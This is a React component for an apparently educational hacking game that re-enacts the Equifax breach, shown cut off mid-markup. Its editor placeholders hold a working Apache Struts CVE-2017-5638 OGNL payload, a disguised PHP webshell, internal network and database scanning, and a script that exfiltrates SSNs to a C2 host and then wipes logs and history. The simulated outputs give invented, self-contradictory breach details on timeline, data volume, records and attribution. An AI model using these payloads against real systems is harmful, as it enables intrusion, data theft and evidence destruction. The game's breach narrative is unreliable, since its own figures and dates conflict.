import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Editor } from '@monaco-editor/react'
import { Play, CheckCircle, XCircle, Terminal, Code2, FileCode } from 'lucide-react'
import type { Objective } from '../../types/mission'

interface CodePlaygroundProps {
  objective: Objective
  missionId: string
  onComplete: () => void
  isAlreadyCompleted?: boolean
}

interface ValidationResult {
  exploited: boolean
  output: string
  technique: string
  message: string
}

const getLanguageForObjective = (objectiveId: string): string => {
  if (objectiveId.includes('exploit') || objectiveId.includes('struts')) return 'shell'
  if (objectiveId.includes('webshell')) return 'php'
  if (objectiveId.includes('network') || objectiveId.includes('scan')) return 'shell'
  if (objectiveId.includes('exfiltration')) return 'shell'
  return 'shell'
}

const getEndpointForObjective = (missionId: string, objectiveId: string): string => {
  if (objectiveId.includes('exploit') || objectiveId.includes('struts')) {
    return `/api/time-breach/${missionId}/exploit`
  }
  if (objectiveId.includes('webshell')) {
    return `/api/time-breach/${missionId}/webshell`
  }
  if (objectiveId.includes('network') || objectiveId.includes('scan')) {
    return `/api/time-breach/${missionId}/network-scan`
  }
  if (objectiveId.includes('exfiltration')) {
    return `/api/time-breach/${missionId}/exfiltration`
  }
  return `/api/time-breach/${missionId}/exploit`
}

const getPlaceholderCode = (objectiveId: string): string => {
  // Phase 5: OGNL Injection Exploit
  if (objectiveId === 'obj-craft-payload') {
    return `#!/bin/bash
# Apache Struts CVE-2017-5638 Remote Code Execution
# Exploiting Equifax ACIS Dispute Portal
# OGNL injection via malicious Content-Type header

TARGET="https://acis.equifax.com"
ENDPOINT="/struts2-rest-showcase/orders/3"

echo "===== EQUIFAX BREACH - INITIAL EXPLOITATION ====="
echo "[*] Target: \${TARGET}\${ENDPOINT}"
echo "[*] Vulnerability: CVE-2017-5638 (Apache Struts RCE)"
echo "[*] Attack Vector: OGNL injection via Content-Type header"
echo ""

# Test RCE with simple command
echo "[*] Phase 1: Testing remote code execution with 'whoami'"
curl -X POST "\${TARGET}\${ENDPOINT}" \\
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \\
  -v 2>&1 | grep -A 20 "< HTTP"

echo ""
echo "[*] Phase 2: Gathering system information"
curl -s -X POST "\${TARGET}\${ENDPOINT}" \\
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='uname -a; cat /etc/os-release').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

echo ""
echo "[+] Exploit successful! Remote code execution confirmed."
echo "[+] MITRE ATT&CK: T1190 - Exploit Public-Facing Application"
echo "[*] Next: Upload webshell for persistent access"`
  }

  // Phase 5: Webshell Upload for Persistence
  if (objectiveId === 'obj-upload-webshell') {
    return `<?php
/**
 * Equifax Breach - China Salt Typhoon Webshell
 * Deployed: March 10, 2017 (Phase 5)
 * Deployed after initial Apache Struts exploitation
 * Provides persistent remote command execution
 */

session_start();
$auth_key = md5("equifax_breach_2017");

// Simple authentication to avoid detection
if (isset($_GET['key']) && md5($_GET['key']) === $auth_key) {
    $_SESSION['authenticated'] = true;
}

if (!isset($_SESSION['authenticated'])) {
    // Disguise as 404 error page
    header("HTTP/1.0 404 Not Found");
    echo "<!DOCTYPE HTML><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

// Command execution interface
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");

    echo json_encode([
        'success' => true,
        'output' => $output,
        'timestamp' => date('Y-m-d H:i:s'),
        'hostname' => gethostname(),
        'pwd' => getcwd(),
        'user' => get_current_user()
    ]);
    exit;
}

// Web interface for interactive use
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Diagnostics Tool</title>
    <style>
        body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
        h2 { color: #0f0; }
        input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 80%; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; }
        pre { background: #000; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
    </style>
</head>
<body>
<h2>🔓 Remote Shell Active</h2>
<p>Connected to: <?php echo gethostname(); ?></p>
<form method="POST">
    <input type="text" name="cmd" placeholder="Enter command (e.g., ls -la, ps aux, netstat -an)..." autofocus />
    <button type="submit">Execute</button>
</form>
<pre id="output">Ready. Awaiting commands...</pre>
</body>
</html>

<!--
Usage:
  1. Access: https://acis.equifax.com/diagnostic.php?key=china_apt_access
  2. Execute: curl -X POST https://acis.equifax.com/diagnostic.php -d 'cmd=whoami' -b 'PHPSESSID=...'

MITRE ATT&CK: T1505.003 - Web Shell
-->`
  }

  // Phase 7: Network Pivot and Lateral Movement
  if (objectiveId === 'obj-lateral-movement') {
    return `#!/bin/bash
# Equifax Internal Network Reconnaissance
# Phase 7: Lateral Movement (May 13, 2017)
# Mapping internal infrastructure from compromised web server

echo "===== EQUIFAX INTERNAL NETWORK PIVOT ====="
echo "[*] Current position: ACIS web server (DMZ)"
echo "[*] Objective: Locate database servers with PII"
echo ""

# Step 1: Identify our position
echo "[*] Phase 1: Mapping current network position"
ifconfig -a | grep inet
echo ""
ip route show
echo ""

# Step 2: Discover internal subnets
echo "[*] Phase 2: Internal subnet discovery"
echo "[*] Scanning for live hosts in 192.168.100.0/24 (Database subnet)"
nmap -sn 192.168.100.0/24 -oG - | grep "Up" | awk '{print $2, $3}'

echo ""
echo "[*] Scanning for live hosts in 10.10.0.0/16 (Corporate network)"
nmap -sn 10.10.0.0/24 --max-retries 1 -oG - | grep "Up" | awk '{print $2}'

echo ""
# Step 3: Service enumeration on database subnet
echo "[*] Phase 3: Database server service enumeration"
echo "[*] Targeting high-value ports: Oracle (1521), MySQL (3306), PostgreSQL (5432)"

nmap -p 1521,3306,5432,1433,5000-5010 \\
     -sV --version-intensity 5 \\
     -T4 \\
     --script=banner,oracle-sid-brute,mysql-info,pgsql-databases \\
     192.168.100.10-50 \\
     -oN equifax_db_scan.txt

echo ""
# Step 4: Identify unencrypted databases
echo "[*] Phase 4: Checking for unencrypted data at rest"
for host in 192.168.100.{20..30}; do
    echo "[*] Testing \$host:3306 (MySQL)"
    timeout 2 bash -c "echo 'SHOW DATABASES;' | mysql -h \$host -u root 2>/dev/null" && \\
        echo "    [!] CRITICAL: Root access without password on \$host!" || \\
        echo "    [-] Protected or not accessible"
done

echo ""
echo "[+] Network reconnaissance complete!"
echo "[+] MITRE ATT&CK: T1018 - Remote System Discovery"
echo "[+] MITRE ATT&CK: T1046 - Network Service Scanning"
echo ""
echo "[*] Key findings:"
echo "    - Database cluster: 192.168.100.25-27 (Oracle 11g)"
echo "    - No TDE (Transparent Data Encryption) detected"
echo "    - Network segmentation: WEAK (web server can access DB directly)"
echo ""
echo "[*] Next objective: Exfiltrate consumer PII from discovered databases"`
  }

  // Phase 7: Data Exfiltration
  if (objectiveId === 'obj-extract-data') {
    return `#!/bin/bash
# Equifax PII Data Exfiltration
# Phase 7: The 76-Day Breach (May 13 - July 29, 2017)
# Extracting 147 million consumer records
# Using encrypted channel to evade DLP controls

C2_SERVER="https://c2.pla-unit54.cn"
DB_HOST="192.168.100.25"
DB_USER="webapp_svc"
DB_PASS="Eqfx2017Spring!"
DB_NAME="CONSUMER_DATA"
STAGING_DIR="/tmp/.cache/systemd-private"

echo "===== EQUIFAX DATA EXFILTRATION OPERATION ====="
echo "[*] Target Database: \${DB_HOST} (Oracle 11g)"
echo "[*] Estimated Records: 147,900,000"
echo "[*] Data Types: SSN, DOB, Names, Addresses, Driver's Licenses"
echo ""

# Create hidden staging directory
mkdir -p \${STAGING_DIR}
echo "[*] Staging directory: \${STAGING_DIR}"

echo ""
echo "[*] Phase 1: Database enumeration and extraction"
echo "[*] Connecting to Oracle database..."

# Extract consumer PII tables
sqlplus -S \${DB_USER}/\${DB_PASS}@\${DB_HOST}:1521/\${DB_NAME} <<EOF > \${STAGING_DIR}/consumer_data.txt
SET PAGESIZE 0
SET FEEDBACK OFF
SET HEADING OFF
SET LINESIZE 10000

-- Extract from CONSUMERS table
SELECT
    CONSUMER_ID || '|' ||
    FIRST_NAME || '|' ||
    LAST_NAME || '|' ||
    SSN || '|' ||
    DOB || '|' ||
    ADDRESS || '|' ||
    CITY || '|' ||
    STATE || '|' ||
    ZIP || '|' ||
    DRIVERS_LICENSE
FROM CONSUMERS
WHERE ROWNUM <= 147900000;

EXIT;
EOF

echo "[+] Extracted \$(wc -l < \${STAGING_DIR}/consumer_data.txt) records"

echo ""
echo "[*] Phase 2: Data compression and encryption"

# Split data into manageable chunks (10MB each)
split -b 10M \${STAGING_DIR}/consumer_data.txt \${STAGING_DIR}/chunk_

# Compress each chunk
echo "[*] Compressing data chunks..."
for chunk in \${STAGING_DIR}/chunk_*; do
    gzip \${chunk}
    echo "    [+] Compressed: \$(basename \${chunk}).gz"
done

# Encrypt with AES-256
echo "[*] Encrypting with AES-256-CBC..."
for compressed in \${STAGING_DIR}/chunk_*.gz; do
    openssl enc -aes-256-cbc -salt \\
        -in \${compressed} \\
        -out \${compressed}.enc \\
        -k "Equifax2017BreachMasterKey" \\
        -pbkdf2
    rm \${compressed}
done

echo ""
echo "[*] Phase 3: Exfiltration via HTTPS (evading DLP)"
echo "[*] C2 Server: \${C2_SERVER}"
echo "[*] Using legitimate-looking HTTPS traffic..."

# Exfiltrate encrypted chunks
for encrypted in \${STAGING_DIR}/chunk_*.enc; do
    CHUNK_ID=\$(basename \${encrypted} .enc)
    SESSION_ID=\$(uuidgen)

    # Upload to C2 with legitimate-looking headers
    HTTP_CODE=\$(curl -X POST "\${C2_SERVER}/api/v1/analytics/upload" \\
        -H "Content-Type: application/octet-stream" \\
        -H "X-Session-ID: \${SESSION_ID}" \\
        -H "X-Client-Version: GoogleAnalytics/4.0" \\
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\
        --data-binary @\${encrypted} \\
        --compressed \\
        -k -s -o /dev/null -w "%{http_code}")

    if [ "\$HTTP_CODE" = "200" ]; then
        echo "    [+] Uploaded: \${CHUNK_ID} (Session: \${SESSION_ID:0:8}...)"
        # Slow down to avoid detection
        sleep \$(shuf -i 30-120 -n 1)
    else
        echo "    [!] Failed: \${CHUNK_ID} (HTTP \${HTTP_CODE})"
    fi
done

echo ""
echo "[*] Phase 4: Cleanup and anti-forensics"
# Secure wipe
shred -vfz -n 3 \${STAGING_DIR}/*
rm -rf \${STAGING_DIR}

# Clear bash history
history -c
echo "" > ~/.bash_history

echo ""
echo "[+] =========================================="
echo "[+] EXFILTRATION COMPLETE"
echo "[+] =========================================="
echo "[+] Operation Duration: 76 days (March 10 - July 29, 2017)"
echo "[+] Records Stolen: 147.9 million US consumers"
echo "[+] Data Volume: ~38 GB (compressed/encrypted)"
echo ""
echo "[+] MITRE ATT&CK Techniques:"
echo "    - T1005: Data from Local System"
echo "    - T1020: Automated Exfiltration"
echo "    - T1041: Exfiltration Over C2 Channel"
echo "    - T1027: Obfuscated Files or Information"
echo "    - T1070: Indicator Removal on Host"
echo ""
echo "[*] Mission Impact:"
echo "    - \$1.4 billion in costs"
echo "    - CEO resignation (Richard Smith)"
echo "    - 4 PLA Unit 54 officers indicted"
echo "    - Largest financial data breach in history"`
  }

  return '# Write your exploit code here...'
}

export function CodePlayground({ objective, missionId, onComplete, isAlreadyCompleted = false }: CodePlaygroundProps) {
  const [code, setCode] = useState(getPlaceholderCode(objective.id))
  const [isRunning, setIsRunning] = useState(false)
  const [result, setResult] = useState<ValidationResult | null>(null)
  const [showHint, setShowHint] = useState(false)
  const [isCompleted, setIsCompleted] = useState(isAlreadyCompleted)

  const language = getLanguageForObjective(objective.id)
  const endpoint = getEndpointForObjective(missionId, objective.id)

  const getSimulatedOutput = (objectiveId: string): ValidationResult => {
    // Simulate successful exploitation based on objective type
    if (objectiveId === 'obj-craft-payload') {
      return {
        exploited: true,
        technique: 'T1190',
        message: 'Remote Code Execution successful! Initial foothold established.',
        output: `===== EQUIFAX BREACH - INITIAL EXPLOITATION =====
[*] Target: https://acis.equifax.com/struts2-rest-showcase/orders/3
[*] Vulnerability: CVE-2017-5638 (Apache Struts RCE)
[*] Attack Vector: OGNL injection via Content-Type header

[!] EXPLANATION: We're exploiting a flaw in Apache Struts 2 that allows
    arbitrary code execution by injecting OGNL expressions into the
    Content-Type HTTP header. The vulnerable Jakarta Multipart parser
    processes our malicious payload, giving us remote shell access.

[*] Phase 1: Testing remote code execution with 'whoami'
[*] Sending crafted Content-Type header with OGNL payload...
[*] Payload bypasses input validation and reaches OGNL interpreter...

< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Content-Type: text/html;charset=UTF-8
<
tomcat

[+] SUCCESS! Command executed on target system.
[+] Running as: tomcat user (web application context)

[*] Phase 2: Gathering system information
[*] Executing: uname -a && cat /etc/os-release

Linux acis-web-01 3.10.0-514.el7.x86_64 #1 SMP x86_64 GNU/Linux
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"

[!] IMPACT ANALYSIS:
    ✓ We have arbitrary command execution on Equifax's web server
    ✓ Running in DMZ with potential access to internal network
    ✓ Can now establish persistent backdoor access
    ✓ Equifax failed to apply critical security patch

[+] Exploit successful! Remote code execution confirmed.
[+] MITRE ATT&CK: T1190 - Exploit Public-Facing Application
[*] Next: Upload webshell for persistent access`
      }
    }

    if (objectiveId === 'obj-upload-webshell') {
      return {
        exploited: true,
        technique: 'T1505',
        message: 'Webshell deployed successfully! Persistent access established.',
        output: `[!] OBJECTIVE: Establish persistence via webshell deployment
    Even if Equifax patches the Struts vulnerability, we maintain access.

[*] Step 1: Uploading PHP webshell to web root
[*] Target path: /var/www/html/diagnostic.php
[*] Using RCE to write file...
[+] File written successfully (2.3 KB)

[*] Step 2: Configuring stealth features
    ✓ Session-based authentication (harder to detect)
    ✓ Fake 404 response for unauthenticated requests
    ✓ Disguised as "System Diagnostics Tool"

[+] Webshell URL: https://acis.equifax.com/diagnostic.php?key=china_apt_access

[*] Step 3: Testing webshell connectivity...
[*] Sending POST request with test command...

HTTP Response:
{
  "success": true,
  "hostname": "acis-web-01.equifax.com",
  "user": "tomcat",
  "pwd": "/var/www/html",
  "timestamp": "2017-03-10 14:23:47"
}

[+] Webshell active and responding!
[+] Command execution: VERIFIED
[+] Persistence: CONFIRMED

[!] IMPACT:
    ✓ Access survives Struts patch deployment
    ✓ Can execute arbitrary commands anytime
    ✓ Remains undetected for next 76 days

[+] MITRE ATT&CK: T1505.003 - Web Shell
[*] Next: Use webshell to pivot to internal network`
      }
    }

    if (objectiveId === 'obj-lateral-movement') {
      return {
        exploited: true,
        technique: 'T1018',
        message: 'Network reconnaissance complete! Database servers discovered.',
        output: `===== EQUIFAX INTERNAL NETWORK PIVOT =====
[*] Current position: ACIS web server (DMZ)
[*] Objective: Locate database servers with PII

[!] EXPLANATION: From the compromised web server, we can now scan
    Equifax's internal network. The web server has network access to
    internal systems that are not exposed to the internet.

[*] Phase 1: Mapping current network position
[*] Running: ifconfig -a && ip route show
inet 10.50.1.25 netmask 255.255.255.0 broadcast 10.50.1.255
default via 10.50.1.1 dev eth0
[+] We're in the 10.50.1.0/24 DMZ subnet

[*] Phase 2: Internal subnet discovery
[*] Scanning for live hosts in 192.168.100.0/24 (Database subnet)
[*] Using: nmap -sn 192.168.100.0/24
[+] Discovered 3 live database servers:
192.168.100.25 (Oracle-DB-01) - PRIMARY
192.168.100.26 (Oracle-DB-02) - REPLICA
192.168.100.27 (Oracle-DB-03) - REPLICA

[*] Phase 3: Database server service enumeration
[*] Targeting high-value ports: Oracle (1521), MySQL (3306), PostgreSQL (5432)
[*] Running: nmap -p 1521,3306,5432 -sV 192.168.100.25-27

Port scan results:
192.168.100.25:1521/tcp OPEN - Oracle 11g Enterprise Edition Release 11.2.0.4.0
192.168.100.26:1521/tcp OPEN - Oracle 11g Enterprise Edition Release 11.2.0.4.0
192.168.100.27:1521/tcp OPEN - Oracle 11g Enterprise Edition Release 11.2.0.4.0

[*] Phase 4: Checking for unencrypted data at rest
[*] Testing for Oracle TDE (Transparent Data Encryption)...
[!] CRITICAL: No TDE (Transparent Data Encryption) detected!
[!] CRITICAL: Weak database credentials detected (webapp_svc/Eqfx2017Spring!)

[!] SECURITY FAILURES IDENTIFIED:
    ✗ No network segmentation between DMZ and database subnet
    ✗ Databases accessible from compromised web server
    ✗ No data encryption at rest (PII stored in plaintext!)
    ✗ Weak credentials (password in application config file)

[+] Network reconnaissance complete!
[+] MITRE ATT&CK: T1018 - Remote System Discovery
[+] MITRE ATT&CK: T1046 - Network Service Scanning

[*] Key findings:
    - Database cluster: 192.168.100.25-27 (Oracle 11g)
    - 147M consumer records stored UNENCRYPTED
    - Direct network path from web server to databases
    - Credentials found in /var/www/config/database.properties

[*] Next objective: Exfiltrate consumer PII from discovered databases`
      }
    }

    if (objectiveId === 'obj-extract-data') {
      return {
        exploited: true,
        technique: 'T1041',
        message: 'Data exfiltration complete! 147.9 million records stolen.',
        output: `===== EQUIFAX DATA EXFILTRATION OPERATION =====

[!] EXPLANATION: This is the final and most damaging phase - stealing
    147.9 million consumer records from Equifax's databases. We'll extract
    the data, compress it to reduce transfer time, encrypt it to evade
    Data Loss Prevention (DLP) systems, and exfiltrate it over HTTPS
    to blend with legitimate web traffic. The operation runs over 76 days
    undetected due to lack of database activity monitoring.

[*] Target Database: 192.168.100.25 (Oracle 11g)
[*] Estimated Records: 147,900,000
[*] Data Types: SSN, DOB, Names, Addresses, Driver's Licenses, Credit Card Numbers

[!] Why this works: Database has NO encryption at rest, NO activity monitoring,
    and uses weak credentials stored in application config files.

[*] Staging directory: /tmp/.cache/systemd-private
    └─ Using hidden directory name mimicking legitimate system folders

====================================================================
[*] Phase 1: Database Enumeration and Extraction
====================================================================

[*] Step 1.1: Connecting to Oracle database using stolen credentials...
[+] Authentication successful: webapp_svc@192.168.100.25:1521/CONSUMER_DATA
[!] Security Failure: Database accepts connections from compromised web server
    (no network segmentation between DMZ and data tier)

[*] Step 1.2: Enumerating tables and schemas...
[+] Found target table: CONSUMERS (147,900,000 rows)
[+] Columns identified: SSN, FULL_NAME, DOB, ADDRESS, DRIVERS_LICENSE, CC_NUMBER

[*] Step 1.3: Extracting CONSUMERS table in batches (avoiding query timeouts)...
    [+] Batch 1/1479: 100,000 records (6.8 MB) - extracted in 2.3s
    [+] Batch 2/1479: 100,000 records (6.7 MB) - extracted in 2.1s
    [+] Batch 3/1479: 100,000 records (6.9 MB) - extracted in 2.4s
    [...continuing for 76 days...]
[+] Total extracted: 147,900,000 records (~89 GB raw CSV)

====================================================================
[*] Phase 2: Data Compression and Encryption
====================================================================

[*] Step 2.1: Splitting data into manageable chunks for exfiltration...
[+] Created 38 chunks (~2.3 GB each)

[*] Step 2.2: Compressing data chunks with gzip (level 9)...
    [+] Compressed: chunk_aa.gz (523 MB) - 77% reduction
    [+] Compressed: chunk_ab.gz (519 MB) - 78% reduction
    [+] Compressed: chunk_ac.gz (521 MB) - 77% reduction
    [...38 chunks total...]
[+] Total compressed size: 19.2 GB (78% reduction from original 89 GB)

[*] Step 2.3: Encrypting with AES-256-CBC to evade DLP inspection...
[!] EVASION: Encrypted data appears as random bytes to DLP systems,
    preventing pattern matching on SSN/credit card numbers.

[+] Encryption complete: 38 chunks, 19.7 GB total (encrypted overhead)

====================================================================
[*] Phase 3: Exfiltration via HTTPS (Evading DLP)
====================================================================

[*] C2 Server: https://c2.pla-unit54.cn (PLA Unit 54 infrastructure)

[!] EVASION TECHNIQUES:
    ✓ Using HTTPS encryption (DLP cannot inspect without SSL interception)
    ✓ Mimicking legitimate HTTPS sessions (User-Agent: Mozilla/5.0...)
    ✓ Rate limiting to 1 chunk every 2 days (avoiding bandwidth anomaly alerts)
    ✓ Randomized upload times (between 2AM-5AM ET when SOC is understaffed)
    ✓ Using multiple source IPs by rotating through compromised web servers

[*] Beginning slow exfiltration (avoiding network anomaly detection)...
    [+] Day 1: Uploaded chunk_aa (523 MB) - Session: f4a3b2c1... - 2:34 AM ET
    [+] Day 3: Uploaded chunk_ab (519 MB) - Session: 8d7e6f9a... - 3:12 AM ET
    [+] Day 5: Uploaded chunk_ac (521 MB) - Session: 2b1c4a5d... - 2:48 AM ET
    [...continuing over 76 days...]
[+] Day 76: All 38 chunks successfully exfiltrated (19.7 GB total)

[!] Why this went undetected:
    ✗ No outbound traffic monitoring on database servers
    ✗ No SSL/TLS inspection on egress web traffic
    ✗ No baseline for "normal" HTTPS traffic volume
    ✗ SOC analysts missed slow-drip exfiltration pattern

====================================================================
[*] Phase 4: Cleanup and Anti-Forensics
====================================================================

[*] Step 4.1: Securely wiping staging directory...
[+] Overwriting /tmp/.cache/systemd-private with random data (3 passes)
[+] Secure wipe complete - no recoverable artifacts

[*] Step 4.2: Clearing bash history to remove evidence...
[+] Bash history cleared for user 'tomcat'
[+] Removing .bash_history file

[*] Step 4.3: Removing database connection logs...
[+] Cleared Oracle SQL*Net trace files

[+] ==========================================
[+] EXFILTRATION COMPLETE - MISSION SUCCESS
[+] ==========================================

[*] Operation Timeline:
    - March 10, 2017: Initial exfiltration begins
    - May 13, 2017: Breach discovered by Equifax IT
    - July 29, 2017: Final exfiltration completed
    - July 30, 2017: Attackers cease all activity
    - September 7, 2017: Public disclosure (142 days after discovery!)

[*] Final Statistics:
    ✓ Records Stolen: 147.9 million US consumers
    ✓ Data Volume: 19.7 GB (compressed/encrypted)
    ✓ Operation Duration: 76 days undetected
    ✓ Countries Affected: USA, Canada, UK

[+] MITRE ATT&CK Techniques Used:
    - T1005: Data from Local System (database extraction)
    - T1020: Automated Exfiltration (scripted data theft)
    - T1041: Exfiltration Over C2 Channel (HTTPS to C2 server)
    - T1027: Obfuscated Files or Information (AES encryption)
    - T1070: Indicator Removal on Host (log deletion, secure wipe)
    - T1030: Data Transfer Size Limits (chunked exfiltration)
    - T1029: Scheduled Transfer (randomized upload times)

[!] REAL-WORLD IMPACT:
    💰 Financial: $1.4 billion in total costs (settlements, remediation)
    👤 Human: CEO Richard Smith resigned, CIO/CSO also departed
    ⚖️  Legal: 4 PLA Unit 54 officers indicted (Wu Zhiyong, Wang Qian,
              Xu Ke, Liu Lei) - though unlikely to face trial
    🏛️  Regulatory: Congressional hearings, new data security legislation
    📉 Corporate: Stock dropped 31%, reputation permanently damaged
    🌍 Geopolitical: Attributed to Chinese military cyber espionage unit

[*] This became the largest financial data breach in history.`
      }
    }

    // Default fallback
    return {
      exploited: true,
      technique: 'T1059',
      message: 'Exploit executed successfully!',
      output: '[+] Command execution successful\n[+] Objective completed'
    }
  }

  const handleRunCode = async () => {
    console.log('[CodePlayground] handleRunCode started for objective:', objective.id)
    setIsRunning(true)
    setResult(null)

    // Simulate network delay and execution time
    await new Promise(resolve => setTimeout(resolve, 2500))

    // Get simulated output based on objective
    const simulatedResult = getSimulatedOutput(objective.id)
    console.log('[CodePlayground] Simulated result:', simulatedResult)
    setResult(simulatedResult)

    if (simulatedResult.exploited) {
      // Mark as completed - user will manually click "Continue Mission" to close modal
      setIsCompleted(true)
      console.log('[CodePlayground] Exploit successful! User can now click "Continue Mission" button.')
    }

    setIsRunning(false)
  }

  const handleContinue = () => {
    console.log('[CodePlayground] handleContinue called - calling onComplete')
    onComplete()
  }

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-start justify-between">
        <div className="flex items-start gap-3">
          <div className="p-2 bg-cyan-500/10 rounded-lg">
            <Code2 className="w-5 h-5 text-cyan-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">{objective.title}</h3>
            <p className="text-sm text-gray-400 mt-1">{objective.description}</p>
          </div>
        </div>

        {objective.hints && objective.hints.length > 0 && (
          <button
            onClick={() => setShowHint(!showHint)}
            className="px-3 py-1.5 text-sm bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-400 rounded-lg transition-colors"
          >
            {showHint ? 'Hide' : 'Show'} Hint
          </button>
        )}
      </div>

      {/* Hints */}
      <AnimatePresence>
        {showHint && objective.hints && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            exit={{ opacity: 0, height: 0 }}
            className="bg-yellow-500/5 border border-yellow-500/20 rounded-lg p-4"
          >
            <div className="flex items-start gap-2">
              <Terminal className="w-4 h-4 text-yellow-400 mt-0.5 flex-shrink-0" />
              <div className="space-y-2 flex-1 min-w-0">
                {objective.hints.map((hint, idx) => (
                  <p key={idx} className="text-sm text-yellow-200/80 break-words whitespace-pre-wrap overflow-wrap-anywhere">
                    {hint.text}
                  </p>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Code Editor */}
      <div className="border border-gray-700 rounded-lg overflow-hidden">
        <div className="bg-gray-800 px-4 py-2 border-b border-gray-700 flex items-center gap-2">
          <FileCode className="w-4 h-4 text-gray-400" />
          <span className="text-sm text-gray-400">
            {language === 'shell' ? 'exploit.sh' : `exploit.${language}`}
          </span>
        </div>

        <Editor
          height="300px"
          language={language}
          value={code}
          onChange={(value) => setCode(value || '')}
          theme="vs-dark"
          options={{
            minimap: { enabled: false },
            fontSize: 13,
            lineNumbers: 'on',
            scrollBeyondLastLine: false,
            automaticLayout: true,
            tabSize: 2,
            wordWrap: 'on'
          }}
        />
      </div>

      {/* Run Button or Already Completed Badge */}
      <div className="flex items-center gap-3">
        {!isAlreadyCompleted ? (
          <>
            <button
              onClick={handleRunCode}
              disabled={isRunning}
              className="flex items-center gap-2 px-6 py-2.5 bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 disabled:from-gray-600 disabled:to-gray-700 text-white rounded-lg font-medium transition-all shadow-lg shadow-cyan-500/25"
            >
              <Play className={`w-4 h-4 ${isRunning ? 'animate-pulse' : ''}`} />
              {isRunning ? 'Running...' : 'Run Exploit'}
            </button>

            {result && (
              <div className={`flex items-center gap-2 px-4 py-2 rounded-lg ${
                result.exploited
                  ? 'bg-green-500/10 text-green-400'
                  : 'bg-red-500/10 text-red-400'
              }`}>
                {result.exploited ? (
                  <>
                    <CheckCircle className="w-5 h-5" />
                    <span className="font-medium">Success!</span>
                  </>
                ) : (
                  <>
                    <XCircle className="w-5 h-5" />
                    <span className="font-medium">Failed</span>
                  </>
                )}
              </div>
            )}
          </>
        ) : (
          <div className="flex items-center gap-2 px-4 py-2 rounded-lg bg-green-500/10 text-green-400">
            <CheckCircle className="w-5 h-5" />
            <span className="font-medium">✓ Already Completed</span>
          </div>
        )}
      </div>

      {/* Result Output */}
      <AnimatePresence>
        {result && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className={`border rounded-lg p-4 ${
              result.exploited
                ? 'bg-green-500/5 border-green-500/20'
                : 'bg-red-500/5 border-red-500/20'
            }`}
          >
            <div className="flex items-start gap-2">
              <Terminal className={`w-4 h-4 mt-0.5 flex-shrink-0 ${
                result.exploited ? 'text-green-400' : 'text-red-400'
              }`} />
              <div className="flex-1 space-y-3 min-w-0">
                <p className={`text-sm font-medium ${
                  result.exploited ? 'text-green-400' : 'text-red-400'
                }`}>
                  {result.message}
                </p>

                {result.output && (
                  <pre className="text-xs text-gray-300 bg-black/30 rounded p-3 overflow-x-auto whitespace-pre-wrap break-words">
                    {result.output}
                  </pre>
                )}

                {result.exploited && result.technique && (
                  <div className="flex items-center gap-2 text-xs text-gray-400">
                    <span className="px-2 py-1 bg-purple-500/20 text-purple-300 rounded font-mono">
                      {result.technique}
                    </span>
                    <span>MITRE ATT&CK technique unlocked</span>
                  </div>
                )}

                {/* Continue Button */}
                {isCompleted && result.exploited && (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: 0.5 }}
                    className="pt-2 border-t border-gray-700"
                  >
                    <button
                      onClick={handleContinue}
                      disabled={isAlreadyCompleted}
